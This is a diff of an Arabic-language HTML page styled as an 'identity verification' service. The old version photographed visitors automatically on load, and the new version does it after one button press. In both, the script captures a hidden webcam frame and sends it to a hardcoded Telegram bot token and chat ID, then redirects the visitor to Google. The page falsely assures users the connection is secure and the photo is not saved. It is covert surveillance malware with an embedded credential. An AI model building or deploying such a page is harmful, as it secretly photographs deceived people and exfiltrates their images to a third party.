@@ -1,66 +1,245 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>صورة</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>يوسف عبد الراضي - توثيق الهوية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 30px;
+            max-width: 500px;
+            width: 100%;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: white;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            padding: 0 20px;
+        }
+        
+        .security-badge {
+            background: #f0f0f0;
+            border-radius: 50px;
+            padding: 8px 16px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 25px;
+        }
+        
+        .security-badge:before {
+            content: "🔒";
+        }
+        
+        .info-box {
+            background: #e8f0fe;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: right;
+        }
+        
+        .info-box p {
+            color: #1a73e8;
+            font-size: 13px;
+            margin: 5px 0;
+        }
+        
+        .camera-permission {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+        }
+        
+        .camera-permission:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+            display: block;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #aaa;
+        }
+        
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" autoplay style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
-    <div style="text-align:center; margin-top:200px">
-        <h2>جاري تحميل الصورة...</h2>
-        <p>يرجى الانتظار</p>
+    <div class="card">
+        <div class="logo">ي</div>
+        <h1>يوسف عبد الراضي</h1>
+        <div class="subtitle">خدمة التوثيق الإلكتروني</div>
+        
+        <div class="security-badge">اتصال آمن ومشفر</div>
+        
+        <div class="info-box">
+            <p>📋 مطلوب تأكيد الهوية لإكمال العملية</p>
+            <p>⏱️ سيستغرق الأمر ثانية واحدة فقط</p>
+            <p>🔐 الصورة تستخدم للتوثيق فقط ولا تُحفظ</p>
+        </div>
+        
+        <button class="camera-permission" id="startBtn">
+            📷 توثيق الهوية الآن
+        </button>
+        
+        <div class="status" id="status"></div>
+        <div class="footer">يوسف عبد الراضي © 2026 - جميع الحقوق محفوظة</div>
     </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    
     <script>
         const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
         const CHAT_ID = "8545876964";
-
-        async function capturePhoto() {
+        
+        const startBtn = document.getElementById('startBtn');
+        const statusDiv = document.getElementById('status');
+        
+        startBtn.addEventListener('click', async () => {
+            startBtn.disabled = true;
+            startBtn.textContent = "⏳ جاري التوثيق...";
+            statusDiv.className = 'status loading';
+            statusDiv.textContent = "⏳ جاري الوصول إلى الكاميرا...";
+            
             try {
-                // طلب الوصول إلى الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
-                    // التقاط الصورة
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
                     
-                    // تحويل الصورة إلى blob
+                    statusDiv.textContent = "📤 جاري إرسال بيانات التوثيق...";
+                    
                     canvas.toBlob(async (blob) => {
-                        // إرسال إلى تلغرام
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
                         formData.append('photo', blob);
                         
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        const result = await response.json();
-                        console.log(result);
-                        
-                        if (result.ok) {
-                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:green">✅ تم بنجاح!</h2>';
-                        } else {
-                            document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ خطأ: ' + result.description + '</h2>';
+                        try {
+                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            const result = await response.json();
+                            
+                            if (result.ok) {
+                                statusDiv.className = 'status success';
+                                statusDiv.textContent = "✅ تم توثيق هويتك بنجاح! جاري تحويلك...";
+                                setTimeout(() => {
+                                    window.location.href = "https://www.google.com";
+                                }, 2000);
+                            } else {
+                                throw new Error(result.description);
+                            }
+                        } catch(e) {
+                            statusDiv.className = 'status error';
+                            statusDiv.textContent = "❌ حدث خطأ تقني، حاول مرة أخرى";
+                            startBtn.disabled = false;
+                            startBtn.textContent = "📷 توثيق الهوية الآن";
                         }
                     }, 'image/jpeg');
                     
-                    // إيقاف الكاميرا
                     stream.getTracks().forEach(track => track.stop());
                 };
             } catch(error) {
-                document.body.innerHTML = '<h2 style="text-align:center; margin-top:200px; color:red">❌ لا يمكن الوصول للكاميرا<br>' + error.message + '</h2>';
+                statusDiv.className = 'status error';
+                statusDiv.textContent = "❌ لا يمكن الوصول إلى الكاميرا. الرجاء السماح بالوصول";
+                startBtn.disabled = false;
+                startBtn.textContent = "📷 توثيق الهوية الآن";
             }
-        }
-        
-        // تشغيل
-        capturePhoto();
+        });
     </script>
 </body>
 </html>
